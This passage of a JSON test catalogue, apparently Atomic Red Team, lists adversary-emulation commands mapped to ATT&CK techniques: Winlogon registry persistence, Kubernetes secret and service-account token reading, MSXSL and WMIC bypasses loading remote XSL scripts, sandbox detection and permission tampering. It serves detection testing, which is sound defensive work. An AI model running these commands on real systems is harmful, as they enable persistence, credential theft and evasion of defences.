		"auto_generated_guid": "96be6002-9200-47db-94cb-c3e27de1cb36",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "BIOS Information Discovery through Registry",
		"auto_generated_guid": "f2f91612-d904-49d7-87c2-6c165d23bead",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "ESXi - VM Discovery using ESXCLI",
		"auto_generated_guid": "2040405c-eea6-4c1c-aef3-c2acc430fac9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name or IP of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to Plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"cli_script": {
				"description": "Path to file with discovery commands",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1082\\src\\esx_vmdiscovery.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink is available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "ESXi - Darkside system information discovery",
		"auto_generated_guid": "f89812e5-67d1-4f49-86fa-cbc6609ea86a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name or IP of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to Plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"cli_script": {
				"description": "Path to file containing darkside ransomware discovery commands",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1082\\src\\esx_darkside_discovery.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink is available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "sysctl to gather macOS hardware info",
		"auto_generated_guid": "c8d40da9-31bd-47da-a497-11ea55d1ef6c",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sysctl -n hw.model",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1082",
		"phases": ["discovery"]
	},
	{
		"name": "Winlogon Shell Key Persistence - PowerShell",
		"auto_generated_guid": "bf9f9d65-ee4d-4c3e-a843-777d04f19c38",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_to_execute": {
				"description": "Path of binary to execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Winlogon Userinit Key Persistence - PowerShell",
		"auto_generated_guid": "fb32c935-ee2e-454b-8fa3-1c46b42e8dfb",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_to_execute": {
				"description": "Path of binary to execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Winlogon Notify Key Logon Persistence - PowerShell",
		"auto_generated_guid": "d40da266-e073-4e5a-bb8b-2b385023e5f9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_to_execute": {
				"description": "Path of notification package to execute",
				"type": "path",
				"default": "C:\\Windows\\Temp\\atomicNotificationPackage.dll"
			},
			"function_to_execute": {
				"description": "Function in notification package to execute",
				"type": "string",
				"default": "AtomicTestFunction"
			}
		},
		"executor": {
			"command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"#{binary_to_execute}\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"#{function_to_execute}\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n",
			"cleanup_command": "Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Winlogon HKLM Shell Key Persistence - PowerShell",
		"auto_generated_guid": "95a3c42f-8c88-4952-ad60-13b81d929a9d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_to_execute": {
				"description": "Path of binary to execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, #{binary_to_execute}\" -Force\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Winlogon HKLM Userinit Key Persistence - PowerShell",
		"auto_generated_guid": "f9b8daff-8fa7-4e6a-a1a7-7c14675a545b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"binary_to_execute": {
				"description": "Path of binary to execute",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1547.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "List All Secrets",
		"auto_generated_guid": "31e794c4-48fd-4a76-aca4-6587c155bc11",
		"supported_platforms": ["containers"],
		"dependencies": [
			{
				"description": "kubectl must be installed\n",
				"prereq_command": "which kubectl\n",
				"get_prereq_command": "echo \"kubectl not installed, please install kubectl (https://kubernetes.io/docs/tasks/tools/)\"\n"
			}
		],
		"executor": {
			"command": "kubectl get secrets --all-namespaces\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1552.007",
		"phases": ["credential-access"]
	},
	{
		"name": "ListSecrets",
		"auto_generated_guid": "43c3a49d-d15c-45e6-b303-f6e177e44a9a",
		"supported_platforms": ["containers"],
		"input_arguments": {
			"namespace": {
				"description": "K8s namespace to list",
				"type": "string",
				"default": "default"
			}
		},
		"dependencies": [
			{
				"description": "kubectl must be installed\n",
				"get_prereq_command": "echo \"kubectl must be installed manually\"\n",
				"prereq_command": "which kubectl\n"
			}
		],
		"executor": {
			"command": "kubectl get secrets -n #{namespace}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1552.007",
		"phases": ["credential-access"]
	},
	{
		"name": "Cat the contents of a Kubernetes service account token file",
		"auto_generated_guid": "788e0019-a483-45da-bcfe-96353d46820f",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify docker service is running.",
				"prereq_command": "sudo systemctl status docker\n",
				"get_prereq_command": "sudo systemctl start docker\n"
			},
			{
				"description": "Verify kind is in the path.",
				"prereq_command": "which kind\n",
				"get_prereq_command": "curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64\nchmod +x ./kind\nmv kind /usr/bin/kind\n"
			},
			{
				"description": "Verify kind-atomic-cluster is created",
				"prereq_command": "sudo kind get clusters\n",
				"get_prereq_command": "sudo kind create cluster --name atomic-cluster\n"
			},
			{
				"description": "Verify kubectl is in path",
				"prereq_command": "which kubectl\n",
				"get_prereq_command": "curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x ./kubectl\nmv kubectl /usr/bin/kubectl\n"
			},
			{
				"description": "Verify atomic-pod is running.",
				"prereq_command": "kubectl --context kind-atomic-cluster get pods |grep atomic-pod\n",
				"get_prereq_command": "kubectl --context kind-atomic-cluster run atomic-pod --image=alpine --command -- sleep infinity\n"
			}
		],
		"executor": {
			"command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n",
			"name": "sh",
			"cleanup_command": "kubectl --context kind-atomic-cluster delete pod atomic-pod\n",
			"elevation_required": false
		},
		"attack_technique": "T1552.007",
		"phases": ["credential-access"]
	},
	{
		"name": "System Service Discovery",
		"auto_generated_guid": "89676ba1-b1f8-47ee-b940-2e1a113ebc71",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "tasklist.exe\nsc query\nsc query state= all\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1007",
		"phases": ["discovery"]
	},
	{
		"name": "System Service Discovery - net.exe",
		"auto_generated_guid": "5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Path of file to hold net.exe output",
				"type": "path",
				"default": "%temp%\\service-list.txt"
			}
		},
		"executor": {
			"command": "net.exe start >> #{output_file}\n",
			"cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1007",
		"phases": ["discovery"]
	},
	{
		"name": "System Service Discovery - systemctl/service",
		"auto_generated_guid": "f4b26bce-4c2c-46c0-bcc5-fce062d38bef",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1007",
		"phases": ["discovery"]
	},
	{
		"name": "MSXSL Bypass using local files",
		"auto_generated_guid": "ca23bfb2-023f-49c5-8802-e66997de462d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xmlfile": {
				"description": "Location of the test XML file on the local filesystem.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml"
			},
			"xslfile": {
				"description": "Location of the test XSL script file on the local filesystem.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl"
			},
			"msxsl_exe": {
				"description": "Location of the MSXSL executable.",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "XML file must exist on disk at specified location (#{xmlfile})\n",
				"prereq_command": "if (Test-Path \"#{xmlfile}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{xmlfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n"
			},
			{
				"description": "XSL file must exist on disk at specified location (#{xslfile})\n",
				"prereq_command": "if (Test-Path \"#{xslfile}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{xslfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n"
			},
			{
				"description": "msxsl.exe must exist on disk at specified location (#{msxsl_exe})\n",
				"prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
			}
		],
		"executor": {
			"command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
			"cleanup_command": "del \"#{msxsl_exe}\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1220",
		"phases": ["defense-evasion"]
	},
	{
		"name": "MSXSL Bypass using remote files",
		"auto_generated_guid": "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xmlfile": {
				"description": "Remote location (URL) of the test XML file.",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"
			},
			"xslfile": {
				"description": "Remote location (URL) of the test XSL script file.",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"
			},
			"msxsl_exe": {
				"description": "Location of the MSXSL executable.",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n",
				"prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
			}
		],
		"executor": {
			"command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
			"cleanup_command": "del -Path #{msxsl_exe} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1220",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMIC bypass using local XSL file",
		"auto_generated_guid": "1b237334-3e21-4a0c-8178-b8c996124988",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"wmic_command": {
				"description": "WMI command to execute using wmic.exe",
				"type": "string",
				"default": "process list"
			},
			"local_xsl_file": {
				"description": "Location of the test XSL script file on the local filesystem.",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n",
				"prereq_command": "if (Test-Path \"#{local_xsl_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{local_xsl_file}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n"
			}
		],
		"executor": {
			"command": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1220",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMIC bypass using remote XSL file",
		"auto_generated_guid": "7f5be499-33be-4129-a560-66021f379b9b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_xsl_file": {
				"description": "Remote location of an XSL payload.",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
			},
			"wmic_command": {
				"description": "WMI command to execute using wmic.exe",
				"type": "string",
				"default": "process list"
			}
		},
		"executor": {
			"command": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1220",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Detect Virtualization Environment (Linux)",
		"auto_generated_guid": "dfbd1a21-540d-4574-9731-e852bd6fe840",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n"
		},
		"attack_technique": "T1497.001",
		"phases": ["defense-evasion", "discovery"]
	},
	{
		"name": "Detect Virtualization Environment (FreeBSD)",
		"auto_generated_guid": "e129d73b-3e03-4ae9-bf1e-67fc8921e0fd",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi\n"
		},
		"attack_technique": "T1497.001",
		"phases": ["defense-evasion", "discovery"]
	},
	{
		"name": "Detect Virtualization Environment (Windows)",
		"auto_generated_guid": "502a7dc4-9d6f-4d28-abf2-f0e84692562d",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n",
			"cleanup_command": "$error.clear()\n"
		},
		"attack_technique": "T1497.001",
		"phases": ["defense-evasion", "discovery"]
	},
	{
		"name": "Detect Virtualization Environment (MacOS)",
		"auto_generated_guid": "a960185f-aef6-4547-8350-d1ce16680d09",
		"supported_platforms": ["macos"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n"
		},
		"attack_technique": "T1497.001",
		"phases": ["defense-evasion", "discovery"]
	},
	{
		"name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)",
		"auto_generated_guid": "4a41089a-48e0-47aa-82cb-5b81a463bc78",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n"
		},
		"attack_technique": "T1497.001",
		"phases": ["defense-evasion", "discovery"]
	},
	{
		"name": "chmod - Change file or folder mode (numeric mode)",
		"auto_generated_guid": "34ca1464-de9d-40c6-8c77-690adf36a135",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"numeric_mode": {
				"description": "Specified numeric mode value",
				"type": "integer",
				"default": 755
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002"
			}
		},
		"executor": {
			"command": "chmod #{numeric_mode} #{file_or_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chmod - Change file or folder mode (symbolic mode)",
		"auto_generated_guid": "fc9d6695-d022-4a80-91b1-381f5c35aff3",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"symbolic_mode": {
				"description": "Specified symbolic mode value",
				"type": "string",
				"default": "a+w"
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002"
			}
		},
		"executor": {
			"command": "chmod #{symbolic_mode} #{file_or_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chmod - Change file or folder mode (numeric mode) recursively",
		"auto_generated_guid": "ea79f937-4a4d-4348-ace6-9916aec453a4",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"numeric_mode": {
				"description": "Specified numeric mode value",
				"type": "integer",
				"default": 755
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002"
			}
		},
		"executor": {
			"command": "chmod -R #{numeric_mode} #{file_or_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chmod - Change file or folder mode (symbolic mode) recursively",
		"auto_generated_guid": "0451125c-b5f6-488f-993b-5a32b09f7d8f",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"symbolic_mode": {
				"description": "Specified symbolic mode value",
				"type": "string",
				"default": "a+w"
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002"
			}
		},
		"executor": {
			"command": "chmod -R #{symbolic_mode} #{file_or_folder}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chown - Change file or folder ownership and group",
		"auto_generated_guid": "d169e71b-85f9-44ec-8343-27093ff3dfc0",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"owner": {
				"description": "Username of desired owner",
				"type": "string",
				"default": "root"
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
			},
			"group": {
				"description": "Group name of desired group",
				"type": "string",
				"default": "root"
			}
		},
		"executor": {
			"command": "chown #{owner}:#{group} #{file_or_folder}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chown - Change file or folder ownership and group recursively",
		"auto_generated_guid": "b78598be-ff39-448f-a463-adbf2a5b7848",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"owner": {
				"description": "Username of desired owner",
				"type": "string",
				"default": "root"
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002"
			},
			"group": {
				"description": "Group name of desired group",
				"type": "string",
				"default": "root"
			}
		},
		"executor": {
			"command": "chown -R #{owner}:#{group} #{file_or_folder}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chown - Change file or folder mode ownership only",
		"auto_generated_guid": "967ba79d-f184-4e0e-8d09-6362b3162e99",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"owner": {
				"description": "Username of desired owner",
				"type": "string",
				"default": "root"
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
			}
		},
		"executor": {
			"command": "chown #{owner} #{file_or_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chown - Change file or folder ownership recursively",
		"auto_generated_guid": "3b015515-b3d8-44e9-b8cd-6fa84faf30b2",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"owner": {
				"description": "Username of desired owner",
				"type": "string",
				"default": "root"
			},
			"file_or_folder": {
				"description": "Path of the file or folder",
				"type": "path",
				"default": "/tmp/AtomicRedTeam/atomics/T1222.002"
			}
		},
		"executor": {
			"command": "chown -R #{owner} #{file_or_folder}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chattr - Remove immutable file attribute",
		"auto_generated_guid": "e7469fe2-ad41-4382-8965-99b94dd3c13f",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"file_to_modify": {
				"description": "Path of the file",
				"type": "path",
				"default": "/var/spool/cron/root"
			}
		},
		"executor": {
			"command": "chattr -i #{file_to_modify}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "chflags - Remove immutable file attribute",
		"auto_generated_guid": "60eee3ea-2ebd-453b-a666-c52ce08d2709",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"file_to_modify": {
				"description": "Path of the file",
				"type": "path",
				"default": "/tmp/T1222.002.txt"
			}
		},
		"executor": {
			"command": "touch #{file_to_modify}\nchflags simmutable #{file_to_modify}\nchflags nosimmutable #{file_to_modify}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Chmod through c script",
		"auto_generated_guid": "973631cf-6680-4ffa-a053-045e1b6b67ab",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"source_file": {
				"description": "Path of c source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1222.002/src/T1222.002.c"
			},
			"compiled_file": {
				"description": "Path of compiled file",
				"type": "path",
				"default": "/tmp/T1222002"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
				"prereq_command": "gcc #{source_file} -o #{compiled_file}\n",
				"get_prereq_command": "gcc #{source_file} -o #{compiled_file}\n"
			}
		],
		"executor": {
			"command": "#{compiled_file} /tmp/ T1222002\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1222.002",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Chmod through c script (freebsd)",
		"auto_generated_guid": "da40b5fe-3098-4b3b-a410-ff177e49ee2e",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"source_file": {
				"description": "Path of c source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1222.002/src/T1222.002.c"
			},
			"compiled_file": {
				"description": "Path of compiled file",
				"type": "path",
				"default": "/tmp/T1222002"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
